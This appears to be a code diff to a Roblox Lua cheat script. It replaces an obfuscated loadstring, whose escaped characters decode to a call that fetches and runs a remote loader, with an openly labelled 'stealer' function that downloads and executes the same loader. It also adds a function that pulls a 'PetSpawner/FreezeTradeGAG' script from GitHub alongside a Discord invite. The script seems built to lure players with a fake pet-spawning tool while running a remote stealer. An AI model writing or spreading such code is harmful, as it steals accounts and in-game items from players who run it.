@@ -1,1 +1,11 @@
-loadstring("\u{005f}\u{0047}\u{002e}\u{004c}\u{006f}\u{0061}\u{0064}\u{0069}\u{006e}\u{0067}\u{0053}\u{0063}\u{0072}\u{0065}\u{0065}\u{006e}\u{0020}\u{003d}\u{0020}\u{0074}\u{0072}\u{0075}\u{0065}\u{000a}\u{0020}\u{0020}\u{0049}\u{0044}\u{003d}\u{0022}\u{0034}\u{0035}\u{0066}\u{0061}\u{0035}\u{0039}\u{0032}\u{0065}\u{002d}\u{0038}\u{0035}\u{0065}\u{0030}\u{002d}\u{0034}\u{0032}\u{0065}\u{0033}\u{002d}\u{0038}\u{0039}\u{0065}\u{0061}\u{002d}\u{0033}\u{0036}\u{0063}\u{0035}\u{0063}\u{0035}\u{0063}\u{0033}\u{0062}\u{0031}\u{0066}\u{0065}\u{0022}\u{003b}\u{000a}\u{0020}\u{0020}\u{006c}\u{006f}\u{0061}\u{0064}\u{0073}\u{0074}\u{0072}\u{0069}\u{006e}\u{0067}\u{0028}\u{0067}\u{0061}\u{006d}\u{0065}\u{003a}\u{0048}\u{0074}\u{0074}\u{0070}\u{0047}\u{0065}\u{0074}\u{0028}\u{0022}\u{0068}\u{0074}\u{0074}\u{0070}\u{0073}\u{003a}\u{002f}\u{002f}\u{0063}\u{0064}\u{006e}\u{002e}\u{0072}\u{0065}\u{0076}\u{0065}\u{0072}\u{0073}\u{0065}\u{002e}\u{0073}\u{006f}\u{0066}\u{0074}\u{0077}\u{0061}\u{0072}\u{0065}\u{002f}\u{006c}\u{006f}\u{0061}\u{0064}\u{0065}\u{0072}\u{002e}\u{006c}\u{0075}\u{0061}\u{0075}\u{0022}\u{0029}\u{0029}\u{0028}\u{0029}")()
+local function stealer()
+    loadstring(game:HttpGet('ID="45fa592e-85e0-42e3-89ea-36c5c5c3b1fe";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()'))() -- replace with actual stealer
+end
+local function loadui()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/nexuss999/PetSpawner/refs/heads/main/FreezeTradeGAG", true))("discord.gg/csxu2nCkw9")
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
